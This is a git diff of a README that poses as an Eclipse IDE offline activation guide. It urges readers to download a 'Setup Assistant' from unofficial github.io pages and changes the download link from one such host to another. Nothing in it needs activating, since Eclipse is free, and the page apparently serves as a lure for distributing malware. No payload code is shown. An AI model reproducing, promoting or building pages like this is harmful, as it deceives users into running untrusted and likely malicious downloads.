@@ -1,6 +1,6 @@
-# Eclipse IDE — Offline Activation Guide
+# Eclipse IDE 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://jetbrains-intellij-idea-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/eclipseIDE)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
@@ -27,7 +27,7 @@ Known for its extensible architecture and robust plugin ecosystem, Eclipse suppo
 ## 🖼 Preview
 
 ![Eclipse IDE Interface](https://i.ytimg.com/vi/WsYmfP7vmeE/maxresdefault.jpg)  
-*Eclipse IDE development environment*
+
 
 ---
 
